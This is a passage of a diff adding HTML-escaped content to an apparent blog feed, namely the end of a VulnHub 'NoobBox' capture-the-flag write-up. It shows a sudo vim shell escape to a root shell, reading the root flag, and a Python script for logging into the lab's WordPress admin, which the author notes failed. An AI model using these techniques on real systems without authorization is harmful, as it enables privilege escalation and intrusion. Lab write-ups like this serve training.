+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+sudo vim -c &amp;#39;:!/bin/bash&amp;#39; #Get the root shell after providing noobbox&amp;#39;s pwd.
+whoami #root
+cat /root.txt # get the root flag
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;!-- raw HTML omitted --&gt;
+
+  &lt;img src=&#34;/img/vulnhub/noobbox/Pasted%20image%2020211005212725.png&#34;  alt=&#34;root flag&#34;  class=&#34;left&#34;  style=&#34;border-radius: 0px;&#34;  /&gt;
+
+
+&lt;h2 id=&#34;5-additional-info&#34;&gt;5. Additional Info&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Tired write a login script to wp-admin, fails&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;11&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;11&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;wp login&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+
+#!/usr/bin/python3
+import requests
+print(&amp;#34;-----------Starting-----------------&amp;#34;)
+wp_login = &amp;#39;http://192.168.1.9/wordpress/wp-login.php&amp;#39;
+wp_admin = &amp;#39;http://192.168.1.9/wordpress/wp-admin/&amp;#39;
+username = &amp;#39;noobbox&amp;#39;
+password = &amp;#39;redacted&amp;#39; #Password redacted for writeup purpose
+
+with requests.Session() as s:
+  try:
+    headers1 = { &amp;#39;Cookie&amp;#39;:&amp;#39;wordpress_test_cookie=WP Cookie check&amp;#39; }
+    datas={ 
+        &amp;#39;log&amp;#39;:username, &amp;#39;pwd&amp;#39;:password, &amp;#39;wp-submit&amp;#39;:&amp;#39;Log In&amp;#39;, 
+        &amp;#39;redirect_to&amp;#39;:wp_admin, &amp;#39;testcookie&amp;#39;:&amp;#39;1&amp;#39;  
+    }
+    print(&amp;#34;Before connecting&amp;#34;)
+    resp = s.post(wp_login, headers=headers1, data=datas)
+    print(&amp;#34;Connected&amp;#34;)
+    resp = s.get(wp_admin)
+    print(resp.text)
+  except:
+    print(&amp;#39;Connection / Authentication Failed!&amp;#39;)
+    quit()
+    
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
 </content>
     </item>
     
